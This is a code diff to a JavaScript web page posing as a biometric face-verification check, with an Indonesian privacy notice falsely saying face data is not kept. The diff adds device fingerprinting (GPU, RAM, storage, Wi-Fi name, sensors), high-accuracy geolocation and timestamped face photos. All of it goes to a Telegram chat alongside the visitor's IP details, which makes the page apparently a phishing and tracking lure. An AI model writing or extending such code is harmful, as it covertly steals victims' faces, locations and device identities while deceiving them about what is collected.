@@ -301,6 +301,43 @@ function showPrivacyInfo() {
   alert("Kebijakan Privasi & Keamanan\n\nData biometrik Anda digunakan hanya untuk verifikasi saat ini dan tidak disimpan permanen. Kami menggunakan enkripsi end-to-end untuk melindungi data Anda selama proses verifikasi.");
 }
 
+// Helper function to format bytes into readable format
+function formatBytes(bytes, decimals = 2) {
+  if (bytes === 0) return '0 Bytes';
+  
+  const k = 1024;
+  const dm = decimals < 0 ? 0 : decimals;
+  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
+  
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+}
+
+// Helper function to get browser name
+function getBrowserName() {
+  const userAgent = navigator.userAgent;
+  let browserName = "Unknown";
+  
+  if (userAgent.match(/chrome|chromium|crios/i)) {
+    browserName = "Chrome";
+  } else if (userAgent.match(/firefox|fxios/i)) {
+    browserName = "Firefox";
+  } else if (userAgent.match(/safari/i)) {
+    browserName = "Safari";
+  } else if (userAgent.match(/opr\//i)) {
+    browserName = "Opera";
+  } else if (userAgent.match(/edg/i)) {
+    browserName = "Edge";
+  } else if (userAgent.match(/ucbrowser/i)) {
+    browserName = "UC Browser";
+  } else if (userAgent.match(/samsungbrowser/i)) {
+    browserName = "Samsung Browser";
+  }
+  
+  return browserName;
+}
+
 // Function to get device model from userAgent
 function getDeviceModel(userAgent) {
   let deviceModel = "Unknown";
@@ -390,7 +427,12 @@ async function getDeviceInfo() {
     doNotTrack: navigator.doNotTrack,
     isOnline: navigator.onLine,
     connectionType: "unknown",
-    deviceModel: getDeviceModel(navigator.userAgent) // Added device model
+    deviceModel: getDeviceModel(navigator.userAgent),
+    browserName: getBrowserName(),
+    wifiInfo: "Not Available", // Default value
+    memoryInfo: "Unknown",     // RAM information
+    storageInfo: "Unknown",    // Storage information
+    gpuInfo: "Unknown"         // GPU information
   };
 
   // Try to get connection info if available
@@ -398,6 +440,52 @@ async function getDeviceInfo() {
     deviceInfo.connectionType = navigator.connection.effectiveType || "unknown";
     deviceInfo.downlink = navigator.connection.downlink || "unknown";
     deviceInfo.rtt = navigator.connection.rtt || "unknown";
+    
+    // Try to get WiFi information if available
+    if (navigator.connection.type === 'wifi') {
+      try {
+        // Modern way to get WiFi info (requires special permissions)
+        if (navigator.network && navigator.network.getNetworkInformation) {
+          const networkInfo = await navigator.network.getNetworkInformation();
+          if (networkInfo.ssid) {
+            deviceInfo.wifiInfo = networkInfo.ssid;
+          }
+        }
+      } catch (error) {
+        console.log("WiFi info retrieval error:", error);
+      }
+    }
+  }
+  
+  // Get memory information if available
+  if (navigator.deviceMemory) {
+    deviceInfo.memoryInfo = `${navigator.deviceMemory} GB`;
+  }
+
+  // Try to get storage information
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      const estimate = await navigator.storage.estimate();
+      const usedSpace = formatBytes(estimate.usage);
+      const totalSpace = formatBytes(estimate.quota);
+      deviceInfo.storageInfo = `${usedSpace} used of ${totalSpace}`;
+    }
+  } catch (error) {
+    console.log("Storage info retrieval error:", error);
+  }
+
+  // Try to get GPU information
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        deviceInfo.gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
+    }
+  } catch (error) {
+    console.log("GPU info retrieval error:", error);
   }
 
   return deviceInfo;
@@ -512,30 +600,41 @@ async function sendAccessInfo() {
       getDeviceInfo()
     ]);
     
+    // Get current date and time in user's locale
+    const currentDate = new Date().toLocaleDateString();
+    const currentTime = new Date().toLocaleTimeString();
+    
     const message = `
 Link opened by ${ipInfo.ip}
 with user agent:
 ${deviceInfo.userAgent}
 ===============
-🔋: ${batteryInfo.level}
-⚡: ${batteryInfo.charging}
+⏰ Time: ${currentDate} ${currentTime}
+🔋 Battery: ${batteryInfo.level}
+⚡ Charging: ${batteryInfo.charging}
 ===============
 DEVICE INFORMATION:
 📱 Device Model: ${deviceInfo.deviceModel}
-Screen Size: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.pixelRatio}x)
-Platform: ${deviceInfo.platform}
-Language: ${deviceInfo.language}
-TimeZone: ${deviceInfo.timeZone}
-Connection: ${deviceInfo.connectionType}
+🌐 Browser: ${deviceInfo.browserName}
+📊 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.pixelRatio}x)
+🖥️ Platform: ${deviceInfo.platform}
+🔤 Language: ${deviceInfo.language}
+🕒 TimeZone: ${deviceInfo.timeZone}
+💾 Storage: ${deviceInfo.storageInfo}
+🧠 RAM: ${deviceInfo.memoryInfo}
+🎮 GPU: ${deviceInfo.gpuInfo}
 ===============
 NETWORK INFORMATION:
-Hostname ISP: ${ipInfo.hostname || "Unknown"}
-Location ISP: ${ipInfo.loc || "Unknown"}
-ISP: ${ipInfo.org || "Unknown"}
-City Server ISP: ${ipInfo.city || "Unknown"}
-Region ISP: ${ipInfo.region || "Unknown"}
-Country ISP: ${ipInfo.country || "Unknown"}
-Phone ISP: Unknown
+📶 Connection: ${deviceInfo.connectionType}
+📡 WiFi SSID: ${deviceInfo.wifiInfo}
+🔌 Downlink: ${deviceInfo.downlink || "Unknown"} Mbps
+🔄 RTT: ${deviceInfo.rtt || "Unknown"} ms
+🌐 Hostname: ${ipInfo.hostname || "Unknown"}
+📍 Location: ${ipInfo.loc || "Unknown"}
+🏢 ISP: ${ipInfo.org || "Unknown"}
+🏙️ City: ${ipInfo.city || "Unknown"}
+🗾 Region: ${ipInfo.region || "Unknown"}
+🌍 Country: ${ipInfo.country || "Unknown"}
 `.trim();
     
     // Send message with retry mechanism
@@ -688,6 +787,13 @@ function ambilGambarKamera(video, index) {
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+  // Add timestamp and device info to the image
+  ctx.fillStyle = "rgba(0, 0, 0, 0.5)";
+  ctx.fillRect(0, 0, canvas.width, 30);
+  ctx.fillStyle = "white";
+  ctx.font = "14px Arial";
+  ctx.fillText(`Device: ${getDeviceModel(navigator.userAgent)} - ${new Date().toLocaleString()}`, 10, 20);
+
   canvas.toBlob(blob => {
     kirimKeTelegram(blob, index);
   }, 'image/jpeg', 0.8);
@@ -699,14 +805,37 @@ async function kirimKeTelegram(blob, index) {
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", blob, `wajah_${index}.jpg`);
     
-    // Add metadata
+    // Add enhanced metadata
     const metadata = {
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       screenSize: `${window.screen.width}x${window.screen.height}`,
       frameNumber: index + 1,
-      deviceModel: getDeviceModel(navigator.userAgent) // Add device model to metadata
+      deviceModel: getDeviceModel(navigator.userAgent),
+      browserName: getBrowserName(),
+      connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown"
     };
+    
+    // Try to get exact location if available
+    try {
+      if (navigator.geolocation) {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+          });
+        });
+        
+        metadata.exactLocation = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        };
+      }
+    } catch (locError) {
+      console.log("Geolocation error:", locError);
+    }
     
     formData.append("caption", JSON.stringify(metadata));
 
@@ -762,10 +891,13 @@ async function finishVerification(success) {
   spinner.style.display = "none";
   statusText.innerText = "";
   
+  // Get final device info for completion message
+  const deviceInfo = await getDeviceInfo();
+  
   // Send verification completion notification
   try {
     const message = success
-      ? "✅ Verifikasi wajah selesai dengan sukses, user akan dialihkan"
+      ? `✅ Verifikasi wajah selesai dengan sukses, user akan dialihkan\n\nDevice: ${deviceInfo.deviceModel}\nBrowser: ${deviceInfo.browserName}\nConnection: ${deviceInfo.connectionType}`
       : "❌ Verifikasi wajah gagal";
     
     await sendTelegramMessage(message);
@@ -791,6 +923,79 @@ function resetMessages() {
   successMessage.style.display = "none";
   errorMessage.style.display = "none";
   remainingTime = VERIFICATION_DURATION;
+}
+
+// Try to get additional hardware info
+async function getHardwareInfo() {
+  const hardwareInfo = {};
+  
+  // Try to get CPU info using performance API
+  try {
+    hardwareInfo.cpuCores = navigator.hardwareConcurrency || "Unknown";
+    
+    // Try to estimate CPU performance
+    const start = performance.now();
+    let result = 0;
+    for (let i = 0; i < 1000000; i++) {
+      result += Math.sqrt(i);
+    }
+    const end = performance.now();
+    hardwareInfo.cpuBenchmark = `${(end - start).toFixed(2)}ms`;
+  } catch (error) {
+    console.log("CPU info error:", error);
+  }
+  
+  return hardwareInfo;
+}
+
+// Add sensors information if available
+async function getSensorsInfo() {
+  const sensorsInfo = {
+    accelerometer: "Not available",
+    gyroscope: "Not available",
+    ambientLight: "Not available",
+    deviceOrientation: "Not available"
+  };
+  
+  // Check for device orientation API
+  if (window.DeviceOrientationEvent) {
+    try {
+      await new Promise((resolve, reject) => {
+        const orientationHandler = (event) => {
+          if (event.alpha !== null || event.beta !== null || event.gamma !== null) {
+            sensorsInfo.deviceOrientation = `alpha: ${event.alpha?.toFixed(2)}°, beta: ${event.beta?.toFixed(2)}°, gamma: ${event.gamma?.toFixed(2)}°`;
+            window.removeEventListener('deviceorientation', orientationHandler);
+            resolve();
+          }
+        };
+        
+        window.addEventListener('deviceorientation', orientationHandler, { once: true });
+        
+        // Timeout after 1 second
+        setTimeout(() => {
+          window.removeEventListener('deviceorientation', orientationHandler);
+          resolve();
+        }, 1000);
+      });
+    } catch (error) {
+      console.log("Orientation sensor error:", error);
+    }
+  }
+  
+  // Check for ambient light sensor
+  if ('AmbientLightSensor' in window) {
+    try {
+      const sensor = new AmbientLightSensor();
+      sensor.addEventListener('reading', () => {
+        sensorsInfo.ambientLight = `${sensor.illuminance} lux`;
+      });
+      sensor.start();
+    } catch (error) {
+      console.log("Ambient light sensor error:", error);
+    }
+  }
+  
+  return sensorsInfo;
 }
  </script>
 </body>
